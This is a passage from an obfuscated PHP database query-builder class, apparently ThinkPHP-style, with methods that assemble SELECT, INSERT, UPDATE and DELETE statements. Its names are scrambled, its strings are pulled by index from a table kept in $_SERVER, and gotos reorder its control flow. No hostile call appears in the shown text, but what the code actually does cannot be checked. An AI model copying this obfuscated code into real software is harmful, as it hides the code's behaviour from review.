(is_string($D³õ¹Î‹—„)) { $D³õ¹Î‹—„ = $D¤íÖ© ›õ[952] . $this->escapeString($D³õ¹Î‹—„) . $D¤íÖ© ›õ[952]; } elseif (isset($D³õ¹Î‹—„[0]) && is_string($D³õ¹Î‹—„[0]) && strtolower($D³õ¹Î‹—„[0]) == $D¤íÖ© ›õ[295]) { $D³õ¹Î‹—„ = $this->escapeString($D³õ¹Î‹—„[1]); } elseif (is_array($D³õ¹Î‹—„)) { $D³õ¹Î‹—„ = array_map(array($this, $D¤íÖ© ›õ[953]), $D³õ¹Î‹—„); } elseif (is_bool($D³õ¹Î‹—„)) { $D³õ¹Î‹—„ = $D³õ¹Î‹—„ ? $D¤íÖ© ›õ[87] : $D¤íÖ© ›õ[191]; } elseif (is_null($D³õ¹Î‹—„)) { $D³õ¹Î‹—„ = $D¤íÖ© ›õ[103]; } return $D³õ¹Î‹—„; } protected function parseField($fˆœŠóßÕ) { $B­ÆŠ†ç =& $_SERVER[Ö‘Øù]; if (is_string($fˆœŠóßÕ) && strpos($fˆœŠóßÕ, $B­ÆŠ†ç[47])) { $fˆœŠóßÕ = explode($B­ÆŠ†ç[47], $fˆœŠóßÕ); } if (is_array($fˆœŠóßÕ)) { $eÇÜŠÌŒğø = array(); foreach ($fˆœŠóßÕ as $B½í¹‘îƒ­ => $C”ÔÉ»Ï¢¹) { if (!is_numeric($B½í¹‘îƒ­)) { $eÇÜŠÌŒğø[] = $this->parseKey($B½í¹‘îƒ­, !1) . $B­ÆŠ†ç[991] . $this->parseKey($C”ÔÉ»Ï¢¹); } else { $eÇÜŠÌŒğø[] = $this->parseKey($C”ÔÉ»Ï¢¹); } } $f¶”ĞÓù„Ç = implode($B­ÆŠ†ç[47], $eÇÜŠÌŒğø); } elseif (is_string($fˆœŠóßÕ) && !empty($fˆœŠóßÕ)) { $f¶”ĞÓù„Ç = $fˆœŠóßÕ; } else { $f¶”ĞÓù„Ç = $B­ÆŠ†ç[182]; } return $f¶”ĞÓù„Ç; } protected function parseTable($Bî½¯¨ì©ç) { $EáöËË£ › =& $_SERVER[Ö‘Øù]; if (is_array($Bî½¯¨ì©ç)) { $D×êœš³ = array(); foreach ($Bî½¯¨ì©ç as $D±ß—ì£‘ß => $D¯½É’‡) { if (!is_numeric($D±ß—ì£‘ß)) { $D×êœš³[] = $this->parseKey($D±ß—ì£‘ß) . $EáöËË£ ›[50] . $this->parseKey($D¯½É’‡); } else { $D×êœš³[] = $this->parseKey($D±ß—ì£‘ß); } } $Bî½¯¨ì©ç = $D×êœš³; } elseif (is_string($Bî½¯¨ì©ç)) { if (strstr($Bî½¯¨ì©ç, $EáöËË£ ›[50])) { return $Bî½¯¨ì©ç; } $Bî½¯¨ì©ç = explode($EáöËË£ ›[47], $Bî½¯¨ì©ç); array_walk($Bî½¯¨ì©ç, array($this, $EáöËË£ ›[901])); } return $EáöËË£ ›[895] . trim(implode($EáöËË£ ›[992], $Bî½¯¨ì©ç), $EáöËË£ ›[383]) . $EáöËË£ ›[895]; } protected function parseWhere($e £ö™ÆœÍ) { $F•ä±Ş‡…· =& $_SERVER[Ö‘Øù]; $aŠÀØ«ğÆÏ = $F•ä±Ş‡…·[33]; if (is_string($e £ö™ÆœÍ)) { $aŠÀØ«ğÆÏ = $e £ö™ÆœÍ; } else { $C­À»ĞÚµ = isset($e £ö™ÆœÍ[$F•ä±Ş‡…·[993]]) ? strtoupper($e £ö™ÆœÍ[$F•ä±Ş‡…·[993]]) : $F•ä±Ş‡…·[33]; if (in_array($C­À»ĞÚµ, array($F•ä±Ş‡…·[994], $F•ä±Ş‡…·[995], $F•ä±Ş‡…·[996]))) { $C­À»ĞÚµ = $F•ä±Ş‡…·[50] . $C­À»ĞÚµ . $F•ä±Ş‡…·[50]; unset($e £ö™ÆœÍ[$F•ä±Ş‡…·[993]]); } else { $C­À»ĞÚµ = $F•ä±Ş‡…·[997]; } foreach ($e £ö™ÆœÍ as $d»Ÿ“æºß => $fåó½£Üê) { $aŠÀØ«ğÆÏ .= $F•ä±Ş‡…·[275]; if (is_numeric($d»Ÿ“æºß)) { $d»Ÿ“æºß = $F•ä±Ş‡…·[998]; } if (0 === strpos($d»Ÿ“æºß, $F•ä±Ş‡…·[71])) { $aŠÀØ«ğÆÏ .= $this->parseThinkWhere($d»Ÿ“æºß, $fåó½£Üê); } else { if (!preg_match($F•ä±Ş‡…·[999], trim($d»Ÿ“æºß))) { think_exception(think_lang($F•ä±Ş‡…·[1000]) . $F•ä±Ş‡…·[4] . $d»Ÿ“æºß); } $Cá™ÌÒ£ñ– = is_array($fåó½£Üê) && isset($fåó½£Üê[$F•ä±Ş‡…·[1001]]); $d»Ÿ“æºß = trim($d»Ÿ“æºß); if (strpos($d»Ÿ“æºß, $F•ä±Ş‡…·[281])) { $Bä©èÂÊÄó = explode($F•ä±Ş‡…·[281], $d»Ÿ“æºß); $D¾÷÷Õ„çâ = array(); foreach ($Bä©èÂÊÄó as $DÖº’ØØ => $bÉîçò„­Ã) { $eò”çƒ÷¦ˆ = $Cá™ÌÒ£ñ– ? $fåó½£Üê[$DÖº’ØØ] : $fåó½£Üê; $D¾÷÷Õ„çâ[] = $F•ä±Ş‡…·[258] . $this->parseWhereItem($this->parseKey($bÉîçò„­Ã), $eò”çƒ÷¦ˆ) . $F•ä±Ş‡…·[900]; } $aŠÀØ«ğÆÏ .= implode($F•ä±Ş‡…·[1002], $D¾÷÷Õ„çâ); } elseif (strpos($d»Ÿ“æºß, $F•ä±Ş‡…·[282])) { $Bä©èÂÊÄó = explode($F•ä±Ş‡…·[282], $d»Ÿ“æºß); $D¾÷÷Õ„çâ = array(); foreach ($Bä©èÂÊÄó as $DÖº’ØØ => $bÉîçò„­Ã) { $eò”çƒ÷¦ˆ = $Cá™ÌÒ£ñ– ? $fåó½£Üê[$DÖº’ØØ] : $fåó½£Üê; $D¾÷÷Õ„çâ[] = $F•ä±Ş‡…·[258] . $this->parseWhereItem($this->parseKey($bÉîçò„­Ã), $eò”çƒ÷¦ˆ) . $F•ä±Ş‡…·[900]; } $aŠÀØ«ğÆÏ .= implode($F•ä±Ş‡…·[997], $D¾÷÷Õ„çâ); } else { $aŠÀØ«ğÆÏ .= $this->parseWhereItem($this->parseKey($d»Ÿ“æºß), $fåó½£Üê); } } $aŠÀØ«ğÆÏ .= $F•ä±Ş‡…·[276] . $C­À»ĞÚµ; } $aŠÀØ«ğÆÏ = substr($aŠÀØ«ğÆÏ, 0, -strlen($C­À»ĞÚµ)); } return empty($aŠÀØ«ğÆÏ) ? $F•ä±Ş‡…·[33] : $F•ä±Ş‡…·[1003] . $aŠÀØ«ğÆÏ; } protected function parseWhereItem($cŠ’òê„¢, $eä¿ëˆè•) { $ağ„ÒŠÔ–¬ =& $_SERVER[Ö‘Øù]; $AÎ³‡Ñã‘ = $ağ„ÒŠÔ–¬[33]; if (is_array($eä¿ëˆè•)) { if (is_string($eä¿ëˆè•[0])) { $AÍ·ÓÜÉÅ = strtolower($eä¿ëˆè•[0]); if (in_array($eä¿ëˆè•[0], array($ağ„ÒŠÔ–¬[987], $ağ„ÒŠÔ–¬[1004], $ağ„ÒŠÔ–¬[1005], $ağ„ÒŠÔ–¬[1006], $ağ„ÒŠÔ–¬[1007], $ağ„ÒŠÔ–¬[1008]))) { $AÎ³‡Ñã‘ .= $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $eä¿ëˆè•[0] . $ağ„ÒŠÔ–¬[50] . $this->parseValue($eä¿ëˆè•[1]); } elseif (preg_match($ağ„ÒŠÔ–¬[1009], $eä¿ëˆè•[0])) { $AÎ³‡Ñã‘ .= $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $this->exp[$AÍ·ÓÜÉÅ] . $ağ„ÒŠÔ–¬[50] . $this->parseValue($eä¿ëˆè•[1]); } elseif (preg_match($ağ„ÒŠÔ–¬[1010], $eä¿ëˆè•[0])) { if (is_array($eä¿ëˆè•[1])) { $eè°Œ„äöñ = isset($eä¿ëˆè•[2]) ? strtoupper($eä¿ëˆè•[2]) : $ağ„ÒŠÔ–¬[995]; if (in_array($eè°Œ„äöñ, array($ağ„ÒŠÔ–¬[994], $ağ„ÒŠÔ–¬[995], $ağ„ÒŠÔ–¬[996]))) { $Câ÷Š…®“õ = array(); foreach ($eä¿ëˆè•[1] as $D˜„”Ñğ®®) { $Câ÷Š…®“õ[] = $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $this->exp[$AÍ·ÓÜÉÅ] . $ağ„ÒŠÔ–¬[50] . $this->parseValue($D˜„”Ñğ®®); } $AÎ³‡Ñã‘ .= $ağ„ÒŠÔ–¬[258] . implode($ağ„ÒŠÔ–¬[50] . $eè°Œ„äöñ . $ağ„ÒŠÔ–¬[50], $Câ÷Š…®“õ) . $ağ„ÒŠÔ–¬[900]; } } else { $AÎ³‡Ñã‘ .= $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $this->exp[$AÍ·ÓÜÉÅ] . $ağ„ÒŠÔ–¬[50] . $this->parseValue($eä¿ëˆè•[1]); } } elseif ($ağ„ÒŠÔ–¬[295] == $AÍ·ÓÜÉÅ) { $AÎ³‡Ñã‘ .= $ağ„ÒŠÔ–¬[898] . $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $eä¿ëˆè•[1] . $ağ„ÒŠÔ–¬[1011]; } elseif (preg_match($ağ„ÒŠÔ–¬[1012], $eä¿ëˆè•[0])) { $AÎ³‡Ñã‘ .= $eä¿ëˆè•[0]; } elseif (preg_match($ağ„ÒŠÔ–¬[1013], $eä¿ëˆè•[0])) { if (isset($eä¿ëˆè•[2]) && $ağ„ÒŠÔ–¬[295] == $eä¿ëˆè•[2]) { $AÎ³‡Ñã‘ .= $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $this->exp[$AÍ·ÓÜÉÅ] . $ağ„ÒŠÔ–¬[50] . $eä¿ëˆè•[1]; } else { if (is_string($eä¿ëˆè•[1])) { $eä¿ëˆè•[1] = explode($ağ„ÒŠÔ–¬[47], $eä¿ëˆè•[1]); } $aÇ´Œè¯êŠ = implode($ağ„ÒŠÔ–¬[47], $this->parseValue($eä¿ëˆè•[1])); $AÎ³‡Ñã‘ .= $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $this->exp[$AÍ·ÓÜÉÅ] . $ağ„ÒŠÔ–¬[898] . $aÇ´Œè¯êŠ . $ağ„ÒŠÔ–¬[900]; } } elseif (preg_match($ağ„ÒŠÔ–¬[1014], $eä¿ëˆè•[0])) { $BåõÈÖ…Á‹ = is_string($eä¿ëˆè•[1]) ? explode($ağ„ÒŠÔ–¬[47], $eä¿ëˆè•[1]) : $eä¿ëˆè•[1]; $AÎ³‡Ñã‘ .= $ağ„ÒŠÔ–¬[898] . $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $this->exp[$AÍ·ÓÜÉÅ] . $ağ„ÒŠÔ–¬[50] . $this->parseValue($BåõÈÖ…Á‹[0]) . $ağ„ÒŠÔ–¬[997] . $this->parseValue($BåõÈÖ…Á‹[1]) . $ağ„ÒŠÔ–¬[276]; } else { think_exception(think_lang($ağ„ÒŠÔ–¬[1000]) . $ağ„ÒŠÔ–¬[4] . $eä¿ëˆè•[0]); } } else { $aØ¹«­Ø¶ = count($eä¿ëˆè•); $E÷êøÕÖ« = $ağ„ÒŠÔ–¬[33]; if (is_string($eä¿ëˆè•[$aØ¹«­Ø¶ - 1])) { $E÷êøÕÖ« = isset($eä¿ëˆè•[$aØ¹«­Ø¶ - 1]) ? strtoupper($eä¿ëˆè•[$aØ¹«­Ø¶ - 1]) : $ağ„ÒŠÔ–¬[33]; if (in_array($E÷êøÕÖ«, array($ağ„ÒŠÔ–¬[994], $ağ„ÒŠÔ–¬[995], $ağ„ÒŠÔ–¬[996]))) { $aØ¹«­Ø¶ = $aØ¹«­Ø¶ - 1; } } else { $E÷êøÕÖ« = $ağ„ÒŠÔ–¬[994]; } for ($D•ø†Ÿ«ØĞ = 0; $D•ø†Ÿ«ØĞ < $aØ¹«­Ø¶; $D•ø†Ÿ«ØĞ++) { $BåõÈÖ…Á‹ = is_array($eä¿ëˆè•[$D•ø†Ÿ«ØĞ]) ? $eä¿ëˆè•[$D•ø†Ÿ«ØĞ][1] : $eä¿ëˆè•[$D•ø†Ÿ«ØĞ]; if ($ağ„ÒŠÔ–¬[295] == strtolower($eä¿ëˆè•[$D•ø†Ÿ«ØĞ][0])) { $AÎ³‡Ñã‘ .= $ağ„ÒŠÔ–¬[258] . $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $BåõÈÖ…Á‹ . $ağ„ÒŠÔ–¬[1011] . $E÷êøÕÖ« . $ağ„ÒŠÔ–¬[50]; } else { $B×‚½áÀáŞ = is_array($eä¿ëˆè•[$D•ø†Ÿ«ØĞ]) ? $this->exp[strtolower($eä¿ëˆè•[$D•ø†Ÿ«ØĞ][0])] : $ağ„ÒŠÔ–¬[987]; if (!$B×‚½áÀáŞ && is_array($eä¿ëˆè•[$D•ø†Ÿ«ØĞ]) && in_array($eä¿ëˆè•[$D•ø†Ÿ«ØĞ][0], array($ağ„ÒŠÔ–¬[987], $ağ„ÒŠÔ–¬[1004], $ağ„ÒŠÔ–¬[1005], $ağ„ÒŠÔ–¬[1006], $ağ„ÒŠÔ–¬[1007], $ağ„ÒŠÔ–¬[1008]))) { $B×‚½áÀáŞ = $eä¿ëˆè•[$D•ø†Ÿ«ØĞ][0]; } $AÎ³‡Ñã‘ .= $ağ„ÒŠÔ–¬[258] . $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[50] . $B×‚½áÀáŞ . $ağ„ÒŠÔ–¬[50] . $this->parseValue($BåõÈÖ…Á‹) . $ağ„ÒŠÔ–¬[1011] . $E÷êøÕÖ« . $ağ„ÒŠÔ–¬[50]; } } $AÎ³‡Ñã‘ = substr($AÎ³‡Ñã‘, 0, -4); } } else { $AÎ³‡Ñã‘ .= $cŠ’òê„¢ . $ağ„ÒŠÔ–¬[1015] . $this->parseValue($eä¿ëˆè•); } return $AÎ³‡Ñã‘; } protected function parseThinkWhere($DšÈÄ–¨áÚ, $a¿ˆ›’‹‘¹) { $E¤ğ”Ï¼¼ =& $_SERVER[Ö‘Øù]; $DĞà¨òŞœ = $E¤ğ”Ï¼¼[33]; switch ($DšÈÄ–¨áÚ) { case $E¤ğ”Ï¼¼[350]: $DĞà¨òŞœ = $a¿ˆ›’‹‘¹; break; case $E¤ğ”Ï¼¼[998]: $DĞà¨òŞœ = is_string($a¿ˆ›’‹‘¹) ? $a¿ˆ›’‹‘¹ : substr($this->parseWhere($a¿ˆ›’‹‘¹), 6); break; case $E¤ğ”Ï¼¼[1016]: parse_str($a¿ˆ›’‹‘¹, $b‘½Ş©Œ­ß); if (isset($b‘½Ş©Œ­ß[$E¤ğ”Ï¼¼[993]])) { $fõ¬‡œØÛ = $E¤ğ”Ï¼¼[50] . strtoupper($b‘½Ş©Œ­ß[$E¤ğ”Ï¼¼[993]]) . $E¤ğ”Ï¼¼[50]; unset($b‘½Ş©Œ­ß[$E¤ğ”Ï¼¼[993]]); } else { $fõ¬‡œØÛ = $E¤ğ”Ï¼¼[997]; } $c»—ÃÒâ = array(); foreach ($b‘½Ş©Œ­ß as $bâ«ºÙ°Éè => $B ¬‘ÔÏÀ¨) { $c»—ÃÒâ[] = $this->parseKey($bâ«ºÙ°Éè) . $E¤ğ”Ï¼¼[1015] . $this->parseValue($B ¬‘ÔÏÀ¨); } $DĞà¨òŞœ = implode($fõ¬‡œØÛ, $c»—ÃÒâ); break; } return $DĞà¨òŞœ; } protected function parseLimit($føŠ¼‰Â) { $DÔÎÕàÄ­ =& $_SERVER[Ö‘Øù]; return !empty($føŠ¼‰Â) ? $DÔÎÕàÄ­[48] . $føŠ¼‰Â . $DÔÎÕàÄ­[50] : $DÔÎÕàÄ­[33]; } protected function parseJoin($C¯—ÁŒÀâ) { $cŒ™‡“ÓÃÜ =& $_SERVER[Ö‘Øù]; $d¤ŸŞĞ£æ = $cŒ™‡“ÓÃÜ[33]; if (!empty($C¯—ÁŒÀâ)) { if (is_array($C¯—ÁŒÀâ)) { foreach ($C¯—ÁŒÀâ as $eä–ğì£“é => $båõ‡¬÷›) { if (!1 !== stripos($båõ‡¬÷›, $cŒ™‡“ÓÃÜ[1017])) { $d¤ŸŞĞ£æ .= $cŒ™‡“ÓÃÜ[50] . $båõ‡¬÷›; } else { $d¤ŸŞĞ£æ .= $cŒ™‡“ÓÃÜ[1018] . $båõ‡¬÷›; } } } else { $d¤ŸŞĞ£æ .= $cŒ™‡“ÓÃÜ[1018] . $C¯—ÁŒÀâ; } } $d¤ŸŞĞ£æ = preg_replace($cŒ™‡“ÓÃÜ[1019], think_config($cŒ™‡“ÓÃÜ[925]) . $cŒ™‡“ÓÃÜ[1020], $d¤ŸŞĞ£æ); return $d¤ŸŞĞ£æ; } protected function parseOrder($FÒß°’í‹) { $Fßô ¥µ÷õ =& $_SERVER[Ö‘Øù]; if (is_array($FÒß°’í‹)) { $bù†Û¥ó»Æ = array(); foreach ($FÒß°’í‹ as $f¸„ä±ÂÑ© => $b™ñ†µÍÜ) { if (is_numeric($f¸„ä±ÂÑ©)) { $bù†Û¥ó»Æ[] = $this->parseKey($b™ñ†µÍÜ); } else { $b™ñ†µÍÜ = in_array(strtoupper(trim($b™ñ†µÍÜ)), array($Fßô ¥µ÷õ[1021], $Fßô ¥µ÷õ[1022])) ? $Fßô ¥µ÷õ[50] . $b™ñ†µÍÜ : $Fßô ¥µ÷õ[33]; if (preg_match($Fßô ¥µ÷õ[1023], $f¸„ä±ÂÑ©)) { $bù†Û¥ó»Æ[] = $this->parseKey($f¸„ä±ÂÑ©) . $b™ñ†µÍÜ; } else { think_exception($Fßô ¥µ÷õ[1024] . $f¸„ä±ÂÑ©); } } } $FÒß°’í‹ = implode($Fßô ¥µ÷õ[47], $bù†Û¥ó»Æ); } return !empty($FÒß°’í‹) ? $Fßô ¥µ÷õ[1025] . $FÒß°’í‹ : $Fßô ¥µ÷õ[33]; } protected function parseGroup($bã†¤»Ïì‚) { $bêæÙ‡Áµæ =& $_SERVER[Ö‘Øù]; return !empty($bã†¤»Ïì‚) ? $bêæÙ‡Áµæ[1026] . $bã†¤»Ïì‚ : $bêæÙ‡Áµæ[33]; } protected function parseHaving($BÖøÕŸÑö¸) { $AÇ„”İ‚ =& $_SERVER[Ö‘Øù]; return !empty($BÖøÕŸÑö¸) ? $AÇ„”İ‚[1027] . $BÖøÕŸÑö¸ : $AÇ„”İ‚[33]; } protected function parseComment($eØÑ¬´»‡ì) { $eƒ»ÃÅƒ¯½ =& $_SERVER[Ö‘Øù]; return !empty($eØÑ¬´»‡ì) ? $eƒ»ÃÅƒ¯½[1028] . $eØÑ¬´»‡ì . $eƒ»ÃÅƒ¯½[1029] : $eƒ»ÃÅƒ¯½[33]; } protected function parseDistinct($c‘öƒ²ìÙ) { $A´Ó•áñö =& $_SERVER[Ö‘Øù]; return !empty($c‘öƒ²ìÙ) ? $A´Ó•áñö[1030] : $A´Ó•áñö[33]; } protected function parseUnion($E—›ø¶•áª) { $aÖ•‚æ××³ =& $_SERVER[Ö‘Øù]; if (empty($E—›ø¶•áª)) { return $aÖ•‚æ××³[33]; } if (isset($E—›ø¶•áª[$aÖ•‚æ××³[346]])) { $EÉ‚èÑÒã™ = $aÖ•‚æ××³[1031]; unset($E—›ø¶•áª[$aÖ•‚æ××³[346]]); } else { $EÉ‚èÑÒã™ = $aÖ•‚æ××³[1032]; } foreach ($E—›ø¶•áª as $bÊ½‰ÎŒ‘¶) { $B¦ãÚ¹›Í¸[] = $EÉ‚èÑÒã™ . (is_array($bÊ½‰ÎŒ‘¶) ? $this->buildSelectSql($bÊ½‰ÎŒ‘¶) : $bÊ½‰ÎŒ‘¶); } return implode($aÖ•‚æ××³[50], $B¦ãÚ¹›Í¸); } public function insert($FÀô²Ñ, $eÒ˜±˜î‘§ = array(), $b©ÏÜĞ¿Ü = false) { goto FÚ¶šç‰•; b·Â›ÎÀªÀ: foreach ($FÀô²Ñ as $Eİ¬ç‘ÊØÀ => $eË¿×îİğš) { if (is_array($eË¿×îİğš) && $d¨¥Õñ´–Ù[295] == $eË¿×îİğš[0]) { $BÌÚ´©é©[] = $this->parseKey($Eİ¬ç‘ÊØÀ); $e¿–Ğ±†å[] = $eË¿×îİğš[1]; } elseif (is_scalar($eË¿×îİğš) || is_null($eË¿×îİğš)) { $BÌÚ´©é©[] = $this->parseKey($Eİ¬ç‘ÊØÀ); $e¿–Ğ±†å[] = $this->parseValue($eË¿×îİğš); } } $eßÜ¹ùÜè = ($b©ÏÜĞ¿Ü ? $d¨¥Õñ´–Ù[902] : $d¨¥Õñ´–Ù[903]) . $d¨¥Õñ´–Ù[904] . $this->parseTable($eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[277]]) . $d¨¥Õñ´–Ù[898] . implode($d¨¥Õñ´–Ù[47], $BÌÚ´©é©) . $d¨¥Õñ´–Ù[899] . implode($d¨¥Õñ´–Ù[47], $e¿–Ğ±†å) . $d¨¥Õñ´–Ù[900]; $eßÜ¹ùÜè .= $this->parseLock(isset($eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[854]]) ? $eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[854]] : !1); goto DŠ’ô¸Æ¬ã; DŠ’ô¸Æ¬ã: $eßÜ¹ùÜè .= $this->parseComment(!empty($eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[352]]) ? $eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[352]] : $d¨¥Õñ´–Ù[33]); return $this->execute($eßÜ¹ùÜè, $this->parseBind(!empty($eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[283]]) ? $eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[283]] : array())); goto aìô„øŒˆÄ; FÚ¶šç‰•: $d¨¥Õñ´–Ù =& $_SERVER[Ö‘Øù]; $e¿–Ğ±†å = $BÌÚ´©é© = array(); $this->model = $eÒ˜±˜î‘§[$d¨¥Õñ´–Ù[279]]; goto b·Â›ÎÀªÀ; aìô„øŒˆÄ: } public function selectInsert($C‚ÎÑ°âÌæ, $aêİŠİ™ÌŒ, $BÊ£ÄÓ¾¯ = array()) { goto BÈç¼‰Šä; b÷®§¥ò»ì: return $this->execute($EÂŒ ƒÊ™Œ, $this->parseBind(!empty($BÊ£ÄÓ¾¯[$aéˆòÂ˜ë°[283]]) ? $BÊ£ÄÓ¾¯[$aéˆòÂ˜ë°[283]] : array())); goto aî¸´ÌÃ«ó; d¼¡ÊĞªØ: array_walk($C‚ÎÑ°âÌæ, array($this, $aéˆòÂ˜ë°[901])); $EÂŒ ƒÊ™Œ = $aéˆòÂ˜ë°[1033] . $this->parseTable($aêİŠİ™ÌŒ) . $aéˆòÂ˜ë°[898] . implode($aéˆòÂ˜ë°[47], $C‚ÎÑ°âÌæ) . $aéˆòÂ˜ë°[1011]; $EÂŒ ƒÊ™Œ .= $this->buildSelectSql($BÊ£ÄÓ¾¯); goto b÷®§¥ò»ì; BÈç¼‰Šä: $aéˆòÂ˜ë° =& $_SERVER[Ö‘Øù]; $this->model = $BÊ£ÄÓ¾¯[$aéˆòÂ˜ë°[279]]; if (is_string($C‚ÎÑ°âÌæ)) { $C‚ÎÑ°âÌæ = explode($aéˆòÂ˜ë°[47], $C‚ÎÑ°âÌæ); } goto d¼¡ÊĞªØ; aî¸´ÌÃ«ó: } public function update($bã¶¬…‚—›, $Fö•‚‡¶®) { $F¿¡é£¦½ñ =& $_SERVER[Ö‘Øù]; $this->model = $Fö•‚‡¶®[$F¿¡é£¦½ñ[279]]; $fŒÄ ÃÚØ¢ = $F¿¡é£¦½ñ[1034] . $this->parseTable($Fö•‚‡¶®[$F¿¡é£¦½ñ[277]]) . $this->parseSet($bã¶¬…‚—›) . $this->parseWhere(!empty($Fö•‚‡¶®[$F¿¡é£¦½ñ[273]]) ? $Fö•‚‡¶®[$F¿¡é£¦½ñ[273]] : $F¿¡é£¦½ñ[33]) . $this->parseOrder(!empty($Fö•‚‡¶®[$F¿¡é£¦½ñ[363]]) ? $Fö•‚‡¶®[$F¿¡é£¦½ñ[363]] : $F¿¡é£¦½ñ[33]) . $this->parseLimit(!empty($Fö•‚‡¶®[$F¿¡é£¦½ñ[290]]) ? $Fö•‚‡¶®[$F¿¡é£¦½ñ[290]] : $F¿¡é£¦½ñ[33]) . $this->parseLock(isset($Fö•‚‡¶®[$F¿¡é£¦½ñ[854]]) ? $Fö•‚‡¶®[$F¿¡é£¦½ñ[854]] : !1) . $this->parseComment(!empty($Fö•‚‡¶®[$F¿¡é£¦½ñ[352]]) ? $Fö•‚‡¶®[$F¿¡é£¦½ñ[352]] : $F¿¡é£¦½ñ[33]); return $this->execute($fŒÄ ÃÚØ¢, $this->parseBind(!empty($Fö•‚‡¶®[$F¿¡é£¦½ñ[283]]) ? $Fö•‚‡¶®[$F¿¡é£¦½ñ[283]] : array())); } public function delete($a¼áå¢ù· = array()) { $D¡Ğ“ÛÔê =& $_SERVER[Ö‘Øù]; $this->model = $a¼áå¢ù·[$D¡Ğ“ÛÔê[279]]; $F‹ïêÉÂìß = $D¡Ğ“ÛÔê[1035] . $this->parseTable($a¼áå¢ù·[$D¡Ğ“ÛÔê[277]]) . $this->parseWhere(!empty($a¼áå¢ù·[$D¡Ğ“ÛÔê[273]]) ? $a¼áå¢ù·[$D¡Ğ“ÛÔê[273]] : $D¡Ğ“ÛÔê[33]) . $this->parseOrder(!empty($a¼áå¢ù·[$D¡Ğ“ÛÔê[363]]) ? $a¼áå¢ù·[$D¡Ğ“ÛÔê[363]] : $D¡Ğ“ÛÔê[33]) . $this->parseLimit(!empty($a¼áå¢ù·[$D¡Ğ“ÛÔê[290]]) ? $a¼áå¢ù·[$D¡Ğ“ÛÔê[290]] : $D¡Ğ“ÛÔê[33]) . $this->parseLock(isset($a¼áå¢ù·[$D¡Ğ“ÛÔê[854]]) ? $a¼áå¢ù·[$D¡Ğ“ÛÔê[854]] : !1) . $this->parseComment(!empty($a¼áå¢ù·[$D¡Ğ“ÛÔê[352]]) ? $a¼áå¢ù·[$D¡Ğ“ÛÔê[352]] : $D¡Ğ“ÛÔê[33]); return $this->execute($F‹ïêÉÂìß, $this->parseBind(!empty($a¼áå¢ù·[$D¡Ğ“ÛÔê[283]]) ? $a¼áå¢ù·[$D¡Ğ“ÛÔê[283]] : array())); } public function select($dŸËÔ·” = array()) { goto cğ™ÛãÑ¹ğ; cğ™ÛãÑ¹ğ: $aç©ê¶Ù–› =& $_SERVER[Ö‘Øù]; $this->model = $dŸËÔ·”[$aç©ê¶Ù–›[279]]; $Eæ×¡µçÖ‹ = $this->buildSelectSql($dŸËÔ·”); goto d¸ÖÛÍ™–î; B¥ÃÅ›‚°: if ($Fğ‘¥˜ŞÊå && !1 !== $fêá¡›ˆ´°) { think_cache($a×ÉÄöõàÆ, $fêá¡›ˆ´°, $Fğ‘¥˜ŞÊå); } return $fêá¡›ˆ´°; goto DáÖ·Ûé™¦; d¸ÖÛÍ™–î: $Fğ‘¥˜ŞÊå = isset($dŸËÔ·”[$aç©ê¶Ù–›[347]]) ? $dŸËÔ·”[$aç©ê¶Ù–›[347]] : !1; if ($Fğ‘¥˜ŞÊå) { $a×ÉÄöõàÆ = is_string($Fğ‘¥˜ŞÊå[$aç©ê¶Ù–›[93]]) ? $Fğ‘¥˜ŞÊå[$aç©ê¶Ù–›[93]] : $aç©ê¶Ù–›[1036] . md5($Eæ×¡µçÖ‹); $böò¦Ş¹‘Š = think_cache($a×ÉÄöõàÆ, $aç©ê¶Ù–›[33], $Fğ‘¥˜ŞÊå); if (!1 !== $böò¦Ş¹‘Š) { return $böò¦Ş¹‘Š; } } $fêá¡›ˆ´° = $this->query($Eæ×¡µçÖ‹, $this->parseBind(!empty($dŸËÔ·”[$aç©ê¶Ù–›[283]]) ? $dŸËÔ·”[$aç©ê¶Ù–›[283]] : array())); goto B¥ÃÅ›‚°; DáÖ·Ûé™¦: } public function buildSelectSql($fÁÛÆ öÇª = array()) { goto Eáù¿ç³À; Eåª÷’îİ: $aÄëõ«‹«ã = $this->parseSql($this->selectSql, $fÁÛÆ öÇª); $aÄëõ«‹«ã .= $this->parseLock(isset($fÁÛÆ öÇª[$FË¨¸˜½¤ï[854]]) ? $fÁÛÆ öÇª[$FË¨¸˜½¤ï[854]] : !1); if (isset($BÊ…ºëÕší)) { think_cache($BÊ…ºëÕší, $aÄëõ«‹«ã); } goto CâÂ”ƒÉÀ®; CâÂ”ƒÉÀ®: return $aÄëõ«‹«ã; goto fÂ·ÎÇ—“; Eáù¿ç³À: $FË¨¸˜½¤ï =& $_SERVER[Ö‘Øù]; if (isset($fÁÛÆ öÇª[$FË¨¸˜½¤ï[351]])) { if (strpos($fÁÛÆ öÇª[$FË¨¸˜½¤ï[351]], $FË¨¸˜½¤ï[47])) { list($d”¶´Ô„È¥, $eÙ²ÚÍ“) = explode($FË¨¸˜½¤ï[47], $fÁÛÆ öÇª[$FË¨¸˜½¤ï[351]]); } else { $d”¶´Ô„È¥ = $fÁÛÆ öÇª[$FË¨¸˜½¤ï[351]]; } $d”¶´Ô„È¥ = $d”¶´Ô„È¥ ? $d”¶´Ô„È¥ : 1; $eÙ²ÚÍ“ = isset($eÙ²ÚÍ“) ? $eÙ²ÚÍ“ : (is_numeric($fÁÛÆ öÇª[$FË¨¸˜½¤ï[290]]) ? $fÁÛÆ öÇª[$FË¨¸˜½¤ï[290]] : 20); $eƒøÊêˆˆ = $eÙ²ÚÍ“ * ((int) $d”¶´Ô„È¥ - 1); 